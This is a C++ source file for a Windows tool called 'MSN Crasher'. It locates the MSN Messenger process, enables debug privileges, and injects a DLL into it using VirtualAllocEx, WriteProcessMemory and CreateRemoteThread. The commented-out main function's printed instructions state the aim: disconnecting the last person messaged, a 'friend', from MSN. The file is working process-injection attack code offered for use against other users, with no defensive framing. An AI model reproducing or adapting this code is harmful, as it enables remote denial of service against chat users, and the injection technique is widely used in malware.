// msncrasher.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <string>
#include "Tlhelp32.h"
#include <algorithm>
#include <shlwapi.h>
#include <commctrl.h>

using namespace std;

#define MAXWAIT 10000

wchar_t MSNProcess[7] = {'m', 's', 'n', 'm', 's', 'g', 'r' };

bool IsMSNString(wchar_t wc[])
{
	for(int i = 0; i < 7; i++)
	{
		if(wc[i] != MSNProcess[i])
			return false;
	}
	return true;
}


HANDLE GetProcessHandle(LPSTR szExeName)
{
		PROCESSENTRY32 Pc = { sizeof(PROCESSENTRY32) };
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	HANDLE phandle = NULL;
		if(Process32First(hSnapshot, &Pc)){
				do{
						if(IsMSNString(Pc.szExeFile)) {
				HANDLE token;
				if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token))
				{
					LUID luid;
					if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
					{
						TOKEN_PRIVILEGES tp;
						tp.PrivilegeCount = 1;
						tp.Privileges[0].Luid = luid;
						tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
						if (AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
						{
										phandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, Pc.th32ProcessID);
						}
					}
				}
				if (phandle == NULL)
				{
					DWORD err = GetLastError();
					err = 0;
				}
						}
				}while(Process32Next(hSnapshot, &Pc));
		}
 
		return phandle;
}

bool InjectDLL(DWORD procID, std::string dll)
{
    //Find the address of the LoadLibrary api, luckily for us, it is loaded in the same address for every process
    HMODULE hLocKernel32 = GetModuleHandle(L"Kernel32");
    FARPROC hLocLoadLibrary = GetProcAddress(hLocKernel32, "LoadLibraryA");
    
    //Adjust token privileges to open system processes
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, 0, &tkp, sizeof(tkp), NULL, NULL);
    }

    //Open the process with all access
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);

    //Allocate memory to hold the path to the Dll File in the process's memory
    dll += '\0';
    LPVOID hRemoteMem = VirtualAllocEx(hProc, NULL, dll.size(), MEM_COMMIT, PAGE_READWRITE);

    //Write the path to the Dll File in the location just created
    DWORD numBytesWritten;
    WriteProcessMemory(hProc, hRemoteMem, dll.c_str(), dll.size(), &numBytesWritten);

    //Create a remote thread that starts begins at the LoadLibrary function and is passed are memory pointer
    HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hLocLoadLibrary, hRemoteMem, 0, NULL);

    //Wait for the thread to finish
    bool res = false;
    if (hRemoteThread)
        res = (bool)WaitForSingleObject(hRemoteThread, MAXWAIT) != WAIT_TIMEOUT;

    //Free the memory created on the other process
    VirtualFreeEx(hProc, hRemoteMem, dll.size(), MEM_RELEASE);

    //Release the handle to the other process
    CloseHandle(hProc);

    return res;
}

std::string getPath() {
    CHAR path[2048];
    GetModuleFileNameA( NULL, path, 2048 );
    PathRemoveFileSpecA( path );
	std::string p( path );
    return p;
}
/*
int _tmain(int argc, _TCHAR* argv[])
{
	printf("MSN Crasher, Program written by Endlesskiss\n");
	printf("Email: doadam@gmail.com\n");

	printf("After the application is loaded, just send someone a message\n");
	printf("Once you see a valid 'Socket ID' (a number), press 'Crash Friend'.\n");
	printf("The last person that you messaged will be disconnected from MSN!\n");

	printf("Getting MSN Process Handle...\n");
	HANDLE pMSN = GetProcessHandle("msnmsgr.exe");
	if(pMSN)
	{
		DWORD dMSN = GetProcessId(pMSN);
		CloseHandle(pMSN);
		char filename[MAX_PATH];
		printf("Injecting DLL... (Process ID: %u)\n", dMSN);
		std::string DLLPath = getPath() + "\\senderinjection.dll";
		//LPCSTR dll_path = DLLPath.c_str();
		if(InjectDLL(dMSN,DLLPath))
		{
			printf("Injected!\n");
			Sleep(2500);
			return 0;
		}
		else
		{
			printf("Could not inject DLL!");
			Sleep(2500);
			return -1;
		}
	}
	else
	{
		printf("Could not get MSN Handle!");
		Sleep(2500);
		return -1;
	}
}
*/